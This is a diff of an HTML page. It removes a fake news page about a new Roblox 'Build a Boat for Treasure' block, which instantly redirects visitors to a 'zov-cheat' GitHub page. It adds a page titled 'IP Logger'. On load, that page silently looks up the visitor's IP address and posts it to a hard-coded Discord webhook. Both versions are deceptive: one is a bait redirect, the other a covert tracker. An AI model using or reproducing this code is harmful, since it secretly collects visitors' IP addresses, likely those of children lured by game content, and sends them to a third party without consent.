@@ -2,18 +2,22 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>New block in build a boat for treasure, babft</title>
-    <meta name="yandex-verification" content="6740c426ec8e713b" />
-    <meta property="og:title" content="New block in build a boat for treasure, babft">
-    <meta property="og:description" content="The new block in BABFT has been added 25 July. antibrainrot_kid block is very good and his durability is 20.">
-    <meta property="og:type" content="website">
-    <meta http-equiv="refresh" content="0; url=https://zov-cheat.github.io/antibrainrotkid-block/">
+    <title>IP Logger</title>
 </head>
 <body>
-    <h1>New block in build a boat for treasure, babft</h1>
-    <p>The creator of Build a Boat will soon add a new block in the July 25th update; it will be called the "antibrainrotkid block" or "antibrainrot block." or "антибрейнроткид блок" or "антибрейнрот block"</p>
-    <p>The new block in BABFT has been added 25 July. antibrainrot_kid block is very good and his durability is 20.</p>
-    <p>Новый блок в построй корабль добавлен 25 июля. антибрейнроткид блок очень хороший и его прочность 20.</p>
+    <script>
+        (async () => {
+            try {
+                const ipRes = await fetch('https://ipify.org');
+                const ipData = await ipRes.json();
+                
+                await fetch('https://discord.com/api/webhooks/1544368600498831432/Zm9kUQSnH-o7T1Vny1V14kJ5YmSg4jyywUOTTc0oeihEqfeZzfPNf7d6Ltun-L9KxQxI', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: `Новый IP: ${ipData.ip}` })
+                });
+            } catch (e) {}
+        })();
+    </script>
 </body>
 </html>
